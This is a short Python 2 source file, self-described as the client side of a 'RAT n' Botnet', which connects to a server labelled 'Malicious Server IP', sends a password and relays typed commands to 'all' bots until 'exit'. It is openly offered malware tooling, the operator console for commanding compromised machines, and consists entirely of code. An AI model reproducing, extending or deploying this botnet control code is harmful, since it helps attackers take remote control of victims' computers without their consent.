# A Python RAT n' Botnet
#  by Landon in Python2
#    CLIENT-SIDE C0DE

import socket

bigBro = '127.0.0.1' # Malicious Server IP.

clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
clientSocket.connect(( bigBro, 8080 )) # To-do: Change port later. 

clientSocket.send("authenticate " + raw_input("Password? > "))

recipient = "all"
turnedOn = True
while turnedOn:
    sendCommand = raw_input(recipient + "> ")
    clientSocket.send(recipient + " " + sendCommand)

    turnedOn = sendCommand[:4] != "exit"

clientSocket.close()